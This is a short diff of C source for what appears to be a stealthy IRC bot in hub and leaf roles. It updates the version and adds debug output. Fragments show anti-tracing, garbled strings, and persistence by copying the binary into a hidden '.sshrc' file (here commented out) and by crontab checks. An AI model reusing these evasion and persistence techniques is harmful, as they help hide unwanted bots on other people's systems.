@@ -79,8 +79,8 @@ extern jmp_buf		 alarmret;
 int role;
 int loading = 0;
 
-char	egg_version[1024] = "1.0.10";
-int	egg_numver = 1001000;
+char	egg_version[1024] = "1.0.11";
+int	egg_numver = 1001100;
 time_t lastfork=0;
 
 #ifdef HUB
@@ -1192,6 +1192,8 @@ int main(int argc, char **argv)
   Context;
   binname = getfullbinname(argv[0]);
   Context;
+  if (SDEBUG)
+    printf("degarble from lang.h test: %s\n", DETEST);
 #ifdef S_ANTITRACE
   {
     int parent = getpid();
@@ -1341,6 +1343,8 @@ Context;
   /* is the homedir a symlink? */
   if (SDEBUG)
     printf("newbin starts at: %s\n", newbin);
+
+/* fuck it, I hate dealing with this shit.
   if (!stat(newbin, &ss)) {
     int f = 0;
     if (ss.st_mode & S_IFLNK) {  //stupid symlinked home dirs !
@@ -1361,15 +1365,12 @@ Context;
         sprintf(newbin, ".sshrc");
         copyfile(binname, newbin);
         skip = 1;
-//        if (newbin[0] == '/' && newbin[1] == 'h' && newbin[2] == 'o') {
-//          sprintf(newbin, "/usr/home/%s/.sshrc", pw->pw_name); //if it fails after this, fuck it.
-//        }
       }
     }
   }
   if (SDEBUG)
     printf(STR("skip is: %d\n"), skip);
-
+*/
   if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
     if (SDEBUG)
       printf("wrong dir, is: %s :: %s\n", binname, newbin);
@@ -1633,9 +1634,15 @@ Context;
   chanprog();
 
 #ifdef LEAF
-  if (localhub)
+  if (localhub) {
+    if (SDEBUG)
+      printf("I am localhub\n");
 #endif
     check_crontab();
+#ifdef LEAF
+  }
+#endif
+
 
   Context;
   if (!encrypt_pass) {
